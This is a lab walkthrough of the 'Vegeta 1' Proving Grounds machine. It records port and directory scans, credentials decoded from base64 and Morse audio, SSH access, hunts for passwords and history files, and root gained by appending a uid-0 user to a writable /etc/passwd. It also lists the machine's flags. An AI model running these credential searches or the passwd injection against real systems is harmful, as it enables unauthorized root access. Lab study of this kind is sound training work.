**Metadata**

- IP Address:  192.168.101.73
- Hostname: 
- OS:  Linux
- Found Credentials/Users:
	- trunks/u$3r
	- unkwn/topshellv

Main Objectives:

Local.txt = f9e26c6e5658d705daf8b558252a8ab9
Proof.txt = 94189f3df3e443b585b93452fdbb3342

**Enumeration**

1. NMAP Scans (TCP/UDP)

```
[+] Running: Nmap BASIC TCP (top 1000)
[+] Command: nmap -sS -Pn -n --top-ports 1000 -T4 --open 192.168.101.73 -
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

[+] Running: Nmap ALL TCP (all ports + versions)
[+] Command: nmap -sS -Pn -n -p- -T4 --open -sV --version-all 
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

[+] Running: Nmap MEDIUM UDP (top 1000 + bounded)
[+] Command: nmap -sU -Pn -n --top-ports 1000 -T4 --open -sV --version-intensity 5 --max-retries 1 --host-timeout 20m 192.168.101.73 -oN /home/kali/ProvingGround/Vegata1/nmap/medium_udp.nmap -oG /home/kali/ProvingGround/Vegata1/nmap/medium_udp.gnmap 
Host is up (0.076s latency).

[+] Open TCP ports (open only): 22, 80
[+] Open UDP ports (open only): <none>
[+] Running: Nmap SCRIPTS TCP (open ports)
[+] Command: nmap -sS -Pn -n -p 22\,\ 80 -sC -sV 192.168.101.73 -oN /home/kali/ProvingGround/Vegata1/nmap/scripts_tcp.nmap 
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 1f:31:30:67:3f:08:30:2e:6d:ae:e3:20:9e:bd:6b:ba (RSA)
|   256 7d:88:55:a8:6f:56:c8:05:a4:73:82:dc:d8:db:47:59 (ECDSA)
|_  256 cc:de:de:4e:84:a8:91:f5:1a:d6:d2:a6:2e:9e:1c:e0 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kerne


```

2. Interesting Ports/Services

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 1f:31:30:67:3f:08:30:2e:6d:ae:e3:20:9e:bd:6b:ba (RSA)
|   256 7d:88:55:a8:6f:56:c8:05:a4:73:82:dc:d8:db:47:59 (ECDSA)
|_  256 cc:de:de:4e:84:a8:91:f5:1a:d6:d2:a6:2e:9e:1c:e0 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
```

3. Web Enumeration 

```

1. Site visit: Looks like a basic pages with a single jpeg. 
2. Web server: Apache HTTP Server Version 2.4
3. Found robot.txt and /find_me directory.
4. In /find_me directory found this string:
   
<!-- aVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQU1nQUFBRElDQVlBQUFDdFdLNmVBQUFIaGtsRVFWUjRuTzJad1k0c09RZ0U1LzkvK3UyMU5TdTdCd3JTaVN0QzhoR2M0SXBMOTg4L0FGanljem9BZ0RNSUFyQUJRUUEySUFqQUJnUUIySUFnQUJzUUJHQURnZ0JzUUJDQURRZ0NzQUZCQURhRUJmbjUrUmwvbk9aTFAxeER6K3g5VTA1cWJoWjFkcjRzSFQyejkwMDVxYmxaMU5uNXNuVDB6TjQzNWFUbVpsRm41OHZTMFRONzM1U1RtcHRGblowdlMwZlA3SDFUVG1wdUZuVjJ2aXdkUGJQM1RUbXB1Vm5VMmZteWRQVE0zamZscE9hdVhKUVRUamxkSHZ0YmxvNDZOUWp5UjV4eUlvZ09CUGtqVGprUlJBZUMvQkdubkFpaUEwSCtpRk5PQk5HQklIL0VLU2VDNkVDUVArS1VFMEYwakJWRS9aSGM4SEhkUHZ1RWQwZVF3N003MWFtelRIaDNCRGs4dTFPZE9zdUVkMGVRdzdNNzFhbXpUSGgzQkRrOHUxT2RPc3VFZDBlUXc3TTcxYW16VEhoM0JEazh1MU9kT3N1RWQwZVFJcWJNNENUcmhKMGhTQkZUWmtDUUdBaFN4SlFaRUNRR2doUXhaUVlFaVlFZ1JVeVpBVUZpSUVnUlUyWkFrQmdJVXNTVUdSQWtCb0lVMFRHZjAxN2UrdTRJVXNScEtSRGtXYzVsdjNEQlN4ZjFqZE5TSU1pem5NdCs0WUtYTHVvYnA2VkFrR2M1bC8zQ0JTOWQxRGRPUzRFZ3ozSXUrNFVMWHJxb2I1eVdBa0dlNVZ6MkN4ZThkRkhmT0MwRmdqekx1ZXdYTGhCL2VGazZjcm84Mm9rc2IzMTNCQkgwdkNITFc5OGRRUVE5YjhqeTFuZEhFRUhQRzdLODlkMFJSTkR6aGl4dmZYY0VFZlM4SWN0YjN4MUJCRDF2eVBMV2R5OFZaTXJwV1BDYjY2YWNEQWdTbUkrNjJTY0RnZ1RtbzI3MnlZQWdnZm1vbTMweUlFaGdQdXBtbnd3SUVwaVB1dGtuQTRJRTVxTnU5c25nOVNPMkFjcmxQN212SXd2OEg3YjVDd1NCVDlqbUx4QUVQbUdidjBBUStJUnQvZ0pCNEJPMitRc0VnVS9ZNWk4UUJENlIvUS9pMURPTFU4OHBkV3FxY3lKSTBlenFubFBxMUNBSWdveXFVNE1nQ0RLcVRnMkNJTWlvT2pVSWdpQ2o2dFFnQ0lLTXFsTnpYQkExYnhZeWk5TU1UbStVeWwvZXNSZ0VpZU0wZzlNYnBmS1hkeXdHUWVJNHplRDBScW44NVIyTFFaQTRUak00dlZFcWYzbkhZaEFranRNTVRtK1V5bC9lc1JnRWllTTBnOU1icGZLWGR5d0dRZUk0emVEMFJxbjhwYzJTUTcxWkFxZlpwd2pTVWJmc2w2cEtoRU1RajV3SUVzeWZxa3FFUXhDUG5BZ1N6SitxU29SREVJK2NDQkxNbjZwS2hFTVFqNXdJRXN5ZnFrcUVReENQbkFnU3pKK3FTb1JERUkrY0NCTE1uNm9xRHVleWpLNmVhcHdFNmNpWjdabkttS29xRHVleWpLNmVhaEFFUVI3VnFYdXFRUkFFZVZTbjdxa0dRUkRrVVoyNnB4b0VRWkJIZGVxZWFoQUVRUjdWcVh1cVFaQ0JncWcvNWpmZjEvRngzUzdXOHE2cHdia1BRUkNFK3hDa01HZnFycW5CdVE5QkVJVDdFS1F3WitxdXFjRzVEMEVRaFBzUXBEQm42cTdLY0ZtY0hzYnBvM1RLMlpGbEFnaHlPQXVDZUlNZ2g3TWdpRGNJY2pnTGduaURJSWV6SUlnM0NISTRDNEo0Z3lDSHN5Q0lONldDM1A0d1RvL3RKTEo2TDhvc0NGSjBueG9FUVpDMkxCMzNxVUVRQkduTDBuR2ZHZ1JCa0xZc0hmZXBRUkFFYWN2U2NaOGFCRUdRdGl3ZDk2bEJrSUdDZE5TcGUyYnZVMzk0Nm5mb3lPazAzN0pmdU1Ba2VGZlA3SDFPSDE3MlBuVk9wL21XL2NJRkpzRzdlbWJ2Yy9yd3N2ZXBjenJOdCt3WExqQUozdFV6ZTUvVGg1ZTlUNTNUYWI1bHYzQ0JTZkN1bnRuN25ENjg3SDNxbkU3ekxmdUZDMHlDZC9YTTN1ZjA0V1h2VStkMG1tL1pMMXhnRXJ5clovWStwdzh2ZTU4NnA5Tjh5MzdoQXZHSGZzUHlPN0pNMmFkNlp3aGkrbWdkODkyd1R3UzU3RUU3WmtjUUJMbm1RVHRtUnhBRXVlWkJPMlpIRUFTNTVrRTdaa2NRQkxubVFUdG1SNUFYQ1hJNzZnKzJBN1dRSFZrNnhFcmxUMVZkRElKNFpFRVFVeERFSXd1Q21JSWdIbGtReEJRRThjaUNJS1lnaUVjV0JERUZRVHl5akJXa1kyRDFjV0xLQitUeXdYNERRUkFFUVlUM0ljaGhFS1FXQkVFUUJCSGVoeUNIUVpCYUVBUkJFRVI0SDRJY0JrRnFzUmJFaVk2Y04zek1UaCtzK28xUy9VNEg2QUpCRUFSQk5pQUlnaURJQmdSQkVBVFpnQ0FJZ2lBYkVBUkJFR1FEZ2lESUtFRnUrTGc2NW5QSzRuVFV1MTdlRlM0d2VqUjF6bzc1bkxJNEhmV3VsM2VGQzR3ZVRaMnpZejZuTEU1SHZldmxYZUVDbzBkVDUreVl6eW1MMDFIdmVubFh1TURvMGRRNU8rWnp5dUowMUx0ZTNoVXVNSG8wZGM2TytaeXlPQjMxcnBkM2hRdU1IazJkczJNK3B5eE9SNzNyNVYzaEFxTkhVK2QwMnN1VUxOTnpJb2h4M1ExWnB1ZEVFT082RzdKTXo0a2d4blUzWkptZUUwR002MjdJTWowbmdoalgzWkJsZWs0RU1hNjdJY3YwbkFoU3hKUVoxRDJuZkMvTEhKWExjQm9ZUVR4NlR2bGVsamtxbCtFME1JSjQ5Snp5dlN4elZDN0RhV0FFOGVnNTVYdFo1cWhjaHRQQUNPTFJjOHIzc3N4UnVReW5nUkhFbytlVTcyV1pvM0laVGdNamlFZlBLZC9MTWtmbE1weVk4bEVxSC9zSlRoODZnaFNBSUxVZ1NQT2kxQ0JJTFFqU3ZDZzFDRklMZ2pRdlNnMkMxSUlnell0U2d5QzFJRWp6b3RRZ1NDMElVckNvS1NjN245TmVzcHplZmNVTTJmbFMvU29EVERrZEMzYWF3U2tuZ2d3OEhRdDJtc0VwSjRJTVBCMExkcHJCS1NlQ0REd2RDM2Fhd1NrbmdndzhIUXQybXNFcEo0SU1QQjBMZHByQktlZnJCQUY0RXdnQ3NBRkJBRFlnQ01BR0JBSFlnQ0FBR3hBRVlBT0NBR3hBRUlBTkNBS3dBVUVBTmlBSXdBWUVBZGp3SHlVRnd2VnIwS3ZGQUFBQUFFbEZUa1N1UW1DQw== -->

5. Passed to cyberchef Password : topshellv. 

[+] Command: gobuster dir -u http://192.168.101.73:80 -w /usr/share/wordlists/dirb/common.txt -t 50 -q -o /home/kali/ProvingGround/Vegata1/gobuster/Vegata1_192.168.101.73_80_dir_basic.txt 
/.hta                 (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/admin                (Status: 301) [Size: 316] [--> http://192.168.101.73/admin/]
/image                (Status: 301) [Size: 316] [--> http://192.168.101.73/image/]
/img                  (Status: 301) [Size: 314] [--> http://192.168.101.73/img/]
/index.html           (Status: 200) [Size: 119]
/manual               (Status: 301) [Size: 317] [--> http://192.168.101.73/manual/]
/robots.txt           (Status: 200) [Size: 11]
/server-status        (Status: 403) [Size: 279]

[+] Command: gobuster dir -u http://192.168.101.73:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o /home/kali/ProvingGround/Vegata1/gobuster/Vegata1_192.168.101.73_80_dir_advanced.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.101.73:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 314] [--> http://192.168.101.73/img/]
/image                (Status: 301) [Size: 316] [--> http://192.168.101.73/image/]
/admin                (Status: 301) [Size: 316] [--> http://192.168.101.73/admin/]
/manual               (Status: 301) [Size: 317] [--> http://192.168.101.73/manual/]
/server-status        (Status: 403) [Size: 279]
Progress: 155689 / 220558 (70.59%)[ERROR] error on word Jan28: timeout occurred during the request
Progress: 220558 / 220558 (100.00%)

 gobuster dir -u http://192.168.101.73 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.101.73
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 314] [--> http://192.168.101.73/img/]
/image                (Status: 301) [Size: 316] [--> http://192.168.101.73/image/]
/admin                (Status: 301) [Size: 316] [--> http://192.168.101.73/admin/]
/manual               (Status: 301) [Size: 317] [--> http://192.168.101.73/manual/]
/server-status        (Status: 403) [Size: 279]
/bulma                (Status: 301) [Size: 316] [--> http://192.168.101.73/bulma/]


```


7. Possible Exploits

```
1. Found morse code audio file at http://192.168.101.73/bulma/hahahaha.wav
   
```

8. Other Notes

```

```

**Initial Foothold** 

1. Exploit Steps

```

1. Found morse code audio file at http://192.168.101.73/bulma/hahahaha.wav

2. Used https://databorder.com/transfer/morse-sound-receiver/ to convert

USER : TRUNKS PASSWORD : US3R<KN>S IN DOLLARS SYMBOL)

3. Logged on via ssh using trunks/u$3r
   
   ssh trunks@192.168.101.73

```

2. Shell Access

```
# Linxu shell upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

**Post-Exploitation**

1. Basic System Info

```
# Linux
hostname
Vegeta

uname -a
Linux Vegeta 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux

cat /etc/os-release 2>/dev/null
PRETTY_NAME="Debian GNU/Linux 10 (buster)"
NAME="Debian GNU/Linux"
VERSION_ID="10"
VERSION="10 (buster)"
VERSION_CODENAME=buster
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"

env
SHELL=/bin/bash
LANGUAGE=en_IN:en
PWD=/home/trunks
LOGNAME=trunks
XDG_SESSION_TYPE=tty
HOME=/home/trunks
LANG=en_IN
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=192.168.45.198 47710 192.168.137.73 22
XDG_SESSION_CLASS=user
TERM=xterm-256color
USER=trunks
SHLVL=1
XDG_SESSION_ID=3
XDG_RUNTIME_DIR=/run/user/1000
SSH_CLIENT=192.168.45.198 47710 22
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
MAIL=/var/mail/trunks
SSH_TTY=/dev/pts/0
_=/usr/bin/env

echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

find / -writable -type d 2>/dev/null | head
/tmp
/tmp/.font-unix
/tmp/.XIM-unix
/tmp/.ICE-unix
/tmp/.X11-unix
/tmp/.Test-unix
/run/user/1000
/run/user/1000/systemd
/run/lock
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service

find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
-rwsr-xr-x 1 root root 34896 Apr 23  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 436552 Feb  1  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51184 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper

cat /etc/crontab 2>/dev/null
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

ls -la /etc/cron.*
drwxr-xr-x  2 root root 4096 Jun 28  2020 .
drwxr-xr-x 77 root root 4096 Aug 12  2020 ..
-rw-r--r--  1 root root  285 May 19  2019 anacron
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
-rw-r--r--  1 root root  190 Jun 28  2020 popularity-contest

/etc/cron.daily:
total 52
drwxr-xr-x  2 root root 4096 Jun 28  2020 .
drwxr-xr-x 77 root root 4096 Aug 12  2020 ..
-rwxr-xr-x  1 root root  311 May 19  2019 0anacron
-rwxr-xr-x  1 root root  539 Apr  3  2019 apache2
-rwxr-xr-x  1 root root 1478 May 28  2019 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1187 Apr 19  2019 dpkg
-rwxr-xr-x  1 root root  377 Aug 29  2018 logrotate
-rwxr-xr-x  1 root root 1123 Feb 10  2019 man-db
-rwxr-xr-x  1 root root  249 Sep 27  2017 passwd
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
-rwxr-xr-x  1 root root 4571 May 20  2018 popularity-contest

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Jun 28  2020 .
drwxr-xr-x 77 root root 4096 Aug 12  2020 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder

/etc/cron.monthly:
total 16
drwxr-xr-x  2 root root 4096 Jun 28  2020 .
drwxr-xr-x 77 root root 4096 Aug 12  2020 ..
-rwxr-xr-x  1 root root  313 May 19  2019 0anacron
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Jun 28  2020 .
drwxr-xr-x 77 root root 4096 Aug 12  2020 ..
-rwxr-xr-x  1 root root  312 May 19  2019 0anacron
-rwxr-xr-x  1 root root  813 Feb 10  2019 man-db
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder

crontab -l 2>/dev/null

getcap -r / 2>/dev/null

ls -l /etc/shadow
-rw-r----- 1 root shadow 976 Aug  4  2020 /etc/shadow

ls -la / 
drwxr-xr-x  18 root root  4096 Jun 30  2020 .
drwxr-xr-x  18 root root  4096 Jun 30  2020 ..
-rw-------   1 root root    54 Jun 30  2020 .bash_history
lrwxrwxrwx   1 root root     7 Jun 28  2020 bin -> usr/bin
drwxr-xr-x   3 root root  4096 Jun 30  2020 boot
drwxr-xr-x  17 root root  3240 Feb 27  2025 dev
drwxr-xr-x  77 root root  4096 Aug 12  2020 etc
drwxr-xr-x   3 root root  4096 Jun 28  2020 home
lrwxrwxrwx   1 root root    30 Jun 28  2020 initrd.img -> boot/initrd.img-4.19.0-9-amd64
lrwxrwxrwx   1 root root    30 Jun 28  2020 initrd.img.old -> boot/initrd.img-4.19.0-9-amd64
lrwxrwxrwx   1 root root     7 Jun 28  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Jun 28  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Jun 28  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Jun 28  2020 libx32 -> usr/libx32
drwx------   2 root root 16384 Jun 28  2020 lost+found
drwxr-xr-x   3 root root  4096 Jun 28  2020 media
drwxr-xr-x   2 root root  4096 Jun 28  2020 mnt
drwxr-xr-x   2 root root  4096 Jun 28  2020 opt
dr-xr-xr-x 123 root root     0 Feb 27  2025 proc
drwx------   3 root root  4096 Jan  1 03:45 root
drwxr-xr-x  17 root root   500 Jan  1 03:46 run
lrwxrwxrwx   1 root root     8 Jun 28  2020 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Jun 28  2020 srv
dr-xr-xr-x  13 root root     0 Feb 27  2025 sys
drwxrwxrwt  10 root root  4096 Jan  1 03:50 tmp
drwxr-xr-x  13 root root  4096 Jun 28  2020 usr
drwxr-xr-x  12 root root  4096 Jun 28  2020 var
lrwxrwxrwx   1 root root    27 Jun 28  2020 vmlinuz -> boot/vmlinuz-4.19.0-9-amd64
lrwxrwxrwx   1 root root    27 Jun 28  2020 vmlinuz.old -> boot/vmlinuz-4.19.0-9-amd64
 


```

2. User Enumeration

```
# Linux
whoami
truncks

id
uid=1000(trunks) gid=1000(trunks) groups=1000(trunks),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)

cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
trunks:x:1000:1000:trunks,,,:/home/trunks:/bin/bash

ls -la /home
total 12
drwxr-xr-x  3 root   root   4096 Jun 28  2020 .
drwxr-xr-x 18 root   root   4096 Jun 30  2020 ..
drwxr-xr-x  3 trunks trunks 4096 Aug 12  2020 trunks

sudo -l
-bash: sudo: command not found

```

3. Network Information

```
# Linux
ss -tulwn
Netid       State        Recv-Q       Send-Q              Local Address:Port                Peer Address:Port       
udp         UNCONN       0            0                         0.0.0.0:50472                    0.0.0.0:*          
tcp         LISTEN       0            128                       0.0.0.0:22                       0.0.0.0:*          
tcp         LISTEN       0            128                          [::]:22                          [::]:*          
tcp         LISTEN       0            128                             *:80                             *:*     

netstat -tulnp 2>/dev/null
```

4. Software, Service, and Process Information

```
# Linux
dpkg -l 
ps aux
ps -ef

```

4. Loot files.
```
# Linux

grep -R "password" /etc 2>/dev/null | head
/etc/ssl/openssl.cnf:# input_password = secret
/etc/ssl/openssl.cnf:# output_password = secret
/etc/ssl/openssl.cnf:challengePassword          = A challenge password
Binary file /etc/alternatives/rsh matches
Binary file /etc/alternatives/from matches
Binary file /etc/alternatives/rlogin matches
/etc/debconf.conf:# World-readable, and accepts everything but passwords.
/etc/debconf.conf:Reject-Type: password
/etc/debconf.conf:# Not world readable (the default), and accepts only passwords.
/etc/debconf.conf:Name: passwords

ls -la /var/www 2>/dev/null
drwxr-xr-x  3 root root 4096 Jun 28  2020 .
drwxr-xr-x 12 root root 4096 Jun 28  2020 ..
drwxr-xr-x  7 root root 4096 Jun 28  2020 html

ls -la /root
ls: cannot open directory '/root': Permission denied

find /home -name "*.txt" 2>/dev/null
/home/trunks/local.txt

find /home -type f -name "*history*" 2>/dev/null
/home/trunks/.bash_history

find /home -type f -name "id_rsa" -o -name "id_*" 2>/dev/null
None

grep -Ri "password\|passwd\|secret\|token\|key" /home 2>/dev/null | head
/home/trunks/.bash_history:perl -le ‘print crypt(“Password@973″,”addedsalt”)’
/home/trunks/.bash_history:perl -le 'print crypt("Password@973","addedsalt")'
/home/trunks/.bash_history:echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd[/sh]
/home/trunks/.bash_history:echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd

find / -name "*.bak" -o -name "*~" 2>/dev/null | head
/var/backups/group.bak
/var/backups/passwd.bak
/var/backups/shadow.bak
/var/backups/gshadow.bak
/var/lib/apt/cdroms.list~
/etc/apt/sources.list~

ls -la /var/backups
drwxr-xr-x  2 root root     4096 Jan  1 03:50 .
drwxr-xr-x 12 root root     4096 Jun 28  2020 ..
-rw-r--r--  1 root root    40960 Jun 30  2020 alternatives.tar.0
-rw-r--r--  1 root root     1896 Jun 28  2020 alternatives.tar.1.gz
-rw-r--r--  1 root root    11159 Jun 30  2020 apt.extended_states.0
-rw-r--r--  1 root root     1241 Jun 28  2020 apt.extended_states.1.gz
-rw-r--r--  1 root root      356 Jun 28  2020 dpkg.diversions.0
-rw-r--r--  1 root root      166 Jun 28  2020 dpkg.diversions.1.gz
-rw-r--r--  1 root root      166 Jun 28  2020 dpkg.diversions.2.gz
-rw-r--r--  1 root root      166 Jun 28  2020 dpkg.diversions.3.gz
-rw-r--r--  1 root root      166 Jun 28  2020 dpkg.diversions.4.gz
-rw-r--r--  1 root root      166 Jun 28  2020 dpkg.diversions.5.gz
-rw-r--r--  1 root root      166 Jun 28  2020 dpkg.diversions.6.gz
-rw-r--r--  1 root root      135 Jun 28  2020 dpkg.statoverride.0
-rw-r--r--  1 root root      142 Jun 28  2020 dpkg.statoverride.1.gz
-rw-r--r--  1 root root      142 Jun 28  2020 dpkg.statoverride.2.gz
-rw-r--r--  1 root root      142 Jun 28  2020 dpkg.statoverride.3.gz
-rw-r--r--  1 root root      142 Jun 28  2020 dpkg.statoverride.4.gz
-rw-r--r--  1 root root      142 Jun 28  2020 dpkg.statoverride.5.gz
-rw-r--r--  1 root root      142 Jun 28  2020 dpkg.statoverride.6.gz
-rw-r--r--  1 root root   379059 Jun 30  2020 dpkg.status.0
-rw-r--r--  1 root root   106000 Jun 30  2020 dpkg.status.1.gz
-rw-r--r--  1 root root   106000 Jun 30  2020 dpkg.status.2.gz
-rw-r--r--  1 root root   106000 Jun 30  2020 dpkg.status.3.gz
-rw-r--r--  1 root root   106000 Jun 30  2020 dpkg.status.4.gz
-rw-r--r--  1 root root   106000 Jun 30  2020 dpkg.status.5.gz
-rw-r--r--  1 root root   106000 Jun 30  2020 dpkg.status.6.gz
-rw-------  1 root root      776 Jun 28  2020 group.bak
-rw-------  1 root shadow    656 Jun 28  2020 gshadow.bak
-rw-------  1 root root     1486 Jun 28  2020 passwd.bak
-rw-------  1 root shadow    976 Aug  4  2020 shadow.bak

```

5. Automated Enumeration

```




```
5. Possible PE Paths

```
1. cat .bash_history
perl -le ‘print crypt(“Password@973″,”addedsalt”)’
perl -le 'print crypt("Password@973","addedsalt")'
echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd[/sh]
echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
ls
su Tom
ls -la
cat .bash_history 
sudo apt-get install vim
apt-get install vim
su root
cat .bash_history 
exit

2. Writable passwd file? ................ /etc/passwd is writable


```

**Privilege Escalation**

1. PE Steps

```
1. echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
2. su Tom
3. cat /root/proof.txt
   94189f3df3e443b585b93452fdbb3342
```

2. Notes

```

```

